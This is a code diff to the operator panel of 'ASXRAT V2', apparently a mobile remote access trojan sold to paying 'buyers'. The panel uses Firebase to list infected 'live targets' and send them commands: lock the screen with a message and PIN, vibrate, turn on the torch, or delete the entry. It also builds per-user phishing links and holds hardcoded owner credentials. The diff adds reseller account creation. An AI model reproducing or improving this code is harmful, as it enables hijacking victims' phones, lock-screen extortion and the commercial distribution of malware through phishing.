@@ -3,38 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>ASXRAT V2 | MASTER PANEL</title>
+    <title>ASXRAT V2 | OWNER PANEL</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        :root { --red: #ff0000; --bg: #000000; --card: #111111; }
+        :root { --red: #ff0000; --bg: #000; --card: #111; }
         body { background: var(--bg); color: #fff; font-family: 'Courier New', monospace; margin: 0; padding: 0; }
         
         #auth { position: fixed; inset: 0; background: var(--bg); z-index: 999; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 15px; }
-        
-        /* BANNER FULL MELINTANG - ANTI KOTAK KECIL */
-        .banner-container { width: 100%; max-width: 400px; position: relative; }
-        .banner-img { 
-            width: 100%; height: 160px; object-fit: cover; 
-            border: 2px solid var(--red); border-bottom: none; 
-            border-radius: 15px 15px 0 0; box-shadow: 0 0 25px rgba(255, 0, 0, 0.6); 
-            display: block; background: #222; /* Warna cadangan kalo loading */
-        }
-
-        .login-card { 
-            background: var(--card); padding: 25px; border: 2px solid var(--red); 
-            border-radius: 0 0 15px 15px; width: 100%; max-width: 400px; 
-            text-align: center; box-shadow: 0 10px 30px rgba(255, 0, 0, 0.4); 
-            margin-top: -2px; box-sizing: border-box; 
-        }
+        .banner-img { width: 100%; max-width: 420px; height: 160px; object-fit: cover; border: 2px solid var(--red); border-bottom: none; border-radius: 15px 15px 0 0; }
+        .login-card { background: var(--card); padding: 25px; border: 2px solid var(--red); border-radius: 0 0 15px 15px; width: 100%; max-width: 420px; text-align: center; margin-top: -1px; box-sizing: border-box; }
         
         input { width: 100%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid #333; color: var(--red); border-radius: 8px; text-align: center; outline: none; font-weight: bold; box-sizing: border-box; }
-        .btn-main { background: var(--red); color: #fff; border: none; padding: 15px; font-weight: bold; border-radius: 8px; width: 100%; cursor: pointer; text-transform: uppercase; margin-top: 10px; box-shadow: 0 0 15px rgba(255, 0, 0, 0.5); }
+        .btn-main { background: var(--red); color: #fff; border: none; padding: 15px; font-weight: bold; border-radius: 8px; width: 100%; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
+
+        #dash { display: none; padding: 15px; max-width: 500px; margin: auto; }
+        .header-box { padding: 15px; border: 1px solid var(--red); border-radius: 12px; background: #0a0a0a; text-align: center; margin-bottom: 20px; }
         
-        /* DASHBOARD AREA */
-        #dash { display: none; padding: 20px; max-width: 500px; margin: auto; }
-        .target-card { background: var(--card); border: 1px solid #222; padding: 15px; margin-bottom: 15px; border-radius: 12px; border-left: 5px solid var(--red); }
-        .control-group { background: #000; padding: 10px; border-radius: 8px; border: 1px solid #222; margin-top: 10px; }
+        /* SECTION BUYER & TARGET */
+        .section-title { color: var(--red); text-align: center; letter-spacing: 2px; margin: 20px 0 10px 0; font-size: 14px; border-bottom: 1px solid #222; padding-bottom: 5px; }
+        .card { background: var(--card); border: 1px solid #222; padding: 15px; margin-bottom: 15px; border-radius: 12px; border-left: 5px solid var(--red); }
         .btn-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; margin-top: 10px; }
         .btn-rat { background: #000; color: #fff; border: 1px solid var(--red); padding: 10px; font-size: 11px; border-radius: 6px; cursor: pointer; font-weight: bold; }
     </style>
@@ -42,26 +30,32 @@
 <body>
 
     <div id="auth">
-        <div class="banner-container">
-            <img src="https://drive.google.com/uc?export=view&id=1vBE16nPKAsIaaKAuUMYg6GgP6Ue28_k7" class="banner-img" onerror="this.src='https://via.placeholder.com/400x160/000000/ff0000?text=ASXRAT+V2'">
-        </div>
+        <img src="https://drive.google.com/uc?export=view&id=1vBE16nPKAsIaaKAuUMYg6GgP6Ue28_k7" class="banner-img">
         <div class="login-card">
-            <div style="font-size:10px; color:#eee; margin-bottom:15px; letter-spacing:1px;">
-                <span style="color:var(--red); font-weight: bold;">POWERED BY : ELVOXI</span><br>
-                CONTACT TELEGRAM : @Elvoxi_Reals01
-            </div>
+            <p style="font-size:10px; color:#aaa;">ADMIN ACCESS : <span style="color:red">ELVOXI</span></p>
             <input type="text" id="email-input" placeholder="EMAIL ADDRESS...">
             <input type="password" id="key-input" placeholder="SECRET KEY...">
-            <button onclick="login()" class="btn-main">ACCESS PANEL</button>
+            <button onclick="login()" class="btn-main">LOGIN OWNER</button>
         </div>
     </div>
 
     <div id="dash">
-        <div style="padding:15px; border:1px solid var(--red); border-radius:10px; background:#050505; text-align:center; margin-bottom:20px;">
-            <b id="user-display" style="color:var(--red); font-size:18px;">...</b><br>
-            <button class="btn-main" onclick="salinLink()" style="background:#fff; color:#000; margin-top:15px;">📋 COPY MY LINK PHISING</button>
+        <div class="header-box">
+            <b id="user-display" style="color:var(--red); font-size:16px;">...</b><br>
+            <button class="btn-main" onclick="salinLink()" style="background:#fff; color:#000; margin-top:10px; height:45px;">📋 COPY MY LINK</button>
         </div>
-        <div id="list"></div>
+
+        <div id="admin-only" style="display:none;">
+            <div class="section-title">👤 REGISTER NEW BUYER</div>
+            <div class="card" style="border-left-color: #00ff00;">
+                <input type="text" id="reg-mail" placeholder="Buyer Email...">
+                <input type="text" id="reg-key" placeholder="Buyer Secret Key...">
+                <button onclick="addBuyer()" class="btn-main" style="background:#00ff00; color:#000;">➕ CREATE BUYER ACCOUNT</button>
+            </div>
+        </div>
+
+        <div class="section-title">📡 LIVE TARGETS</div>
+        <div id="list"><p style="text-align:center; color:#444;">No targets yet...</p></div>
     </div>
 
 <script>
@@ -83,72 +77,85 @@
     function login() {
         const mail = document.getElementById('email-input').value;
         const key = document.getElementById('key-input').value;
+        
+        // Cek Login (Owner atau Buyer)
         if(mail === "elvoxi@gmail.com" && key === "elvoxi122") {
             currentKey = "elvoxi122";
+            document.getElementById('admin-only').style.display = 'block'; // Munculin menu buyer
             start();
         } else {
             db.ref('asxrat/accounts/' + key).once('value', (s) => {
-                const data = s.val();
-                if(s.exists() && data.email === mail) {
+                if(s.exists() && s.val().email === mail) {
                     currentKey = key;
                     start();
-                } else alert("DATA SALAH!");
+                } else alert("AKUN TIDAK TERDAFTAR!");
             });
         }
+    }
+
+    // Fungsi Bikin Akun Buyer (Cuma Owner yang bisa)
+    function addBuyer() {
+        const bMail = document.getElementById('reg-mail').value;
+        const bKey = document.getElementById('reg-key').value;
+        if(!bMail || !bKey) return alert("Isi semua data!");
+        
+        db.ref('asxrat/accounts/' + bKey).set({
+            email: bMail,
+            role: "buyer",
+            createdAt: Date.now()
+        }).then(() => {
+            alert("BUYER BERHASIL DITAMBAHKAN!");
+            document.getElementById('reg-mail').value = "";
+            document.getElementById('reg-key').value = "";
+        });
     }
 
     function start() {
         document.getElementById('auth').style.display = 'none';
         document.getElementById('dash').style.display = 'block';
-        document.getElementById('user-display').innerText = "OWNER: " + currentKey;
+        document.getElementById('user-display').innerText = "LOGGED AS: " + currentKey;
 
         db.ref('mario/targets').on('value', (snap) => {
             const list = document.getElementById('list');
             list.innerHTML = "";
+            let found = false;
             snap.forEach((child) => {
                 const d = child.val();
                 if(d.belongsTo === currentKey) {
+                    found = true;
                     list.innerHTML += `
-                        <div class="target-card">
-                            <b style="color:var(--red)">📱 ${d.model}</b>
-                            <div class="control-group">
-                                <input type="text" id="lock-msg-${child.key}" placeholder="Pesan Lock...">
-                                <input type="text" id="lock-pw-${child.key}" placeholder="Set PW Unlock...">
+                        <div class="card">
+                            <b style="color:red">📱 ${d.model}</b>
+                            <div style="background:#000; padding:10px; border-radius:8px; margin-top:10px;">
+                                <input type="text" id="msg-${child.key}" placeholder="Pesan Lock...">
+                                <input type="text" id="pw-${child.key}" placeholder="Set PIN...">
                                 <div class="btn-grid">
                                     <button class="btn-rat" onclick="sendLock('${child.key}')">🔒 LOCK</button>
                                     <button class="btn-rat" onclick="cmd('${child.key}', 'unlock')">🔓 UNLOCK</button>
                                 </div>
                             </div>
-                            <div class="control-group">
-                                <input type="text" id="tts-${child.key}" placeholder="Ketik suara...">
-                                <div class="btn-grid">
-                                    <button class="btn-rat" onclick="sendTTS('${child.key}')">🗣️ SPEAK</button>
-                                    <button class="btn-rat" onclick="cmd('${child.key}', 'vibrate')">📳 GETAR</button>
-                                    <button class="btn-rat" onclick="cmd('${child.key}', 'torch_on')">🔦 SENTER</button>
-                                    <button class="btn-rat" onclick="db.ref('mario/targets/${child.key}').remove()">🗑️ HAPUS</button>
-                                </div>
+                            <div class="btn-grid">
+                                <button class="btn-rat" onclick="cmd('${child.key}', 'vibrate')">📳 GETAR</button>
+                                <button class="btn-rat" onclick="cmd('${child.key}', 'torch_on')">🔦 SENTER</button>
+                                <button class="btn-rat" onclick="db.ref('mario/targets/${child.key}').remove()">🗑️ HAPUS</button>
                             </div>
                         </div>`;
                 }
             });
+            if(!found) list.innerHTML = "<p style='text-align:center; color:#444;'>No targets found.</p>";
         });
     }
 
     function cmd(id, act) { db.ref('mario/commands/' + id).set({ action: act, time: Date.now() }); }
     function sendLock(id) {
-        const msg = document.getElementById('lock-msg-' + id).value || "LOCKED!";
-        const pw = document.getElementById('lock-pw-' + id).value || "123";
-        db.ref('mario/commands/' + id).set({ action: 'lock_screen', text: msg, pass: pw, time: Date.now() });
-    }
-    function sendTTS(id) {
-        const txt = document.getElementById('tts-' + id).value;
-        if(!txt) return;
-        db.ref('mario/commands/' + id).set({ action: 'speak_text', text: txt, time: Date.now() });
+        const m = document.getElementById('msg-'+id).value || "LOCKED";
+        const p = document.getElementById('pw-'+id).value || "123";
+        db.ref('mario/commands/' + id).set({ action: 'lock_screen', text: m, pass: p, time: Date.now() });
     }
     function salinLink() {
         const encoded = btoa(currentKey);
         navigator.clipboard.writeText(linkPhising + "?id=" + encoded);
-        alert("LINK DISALIN!");
+        alert("LINK COPIED!");
     }
 </script>
 </body>
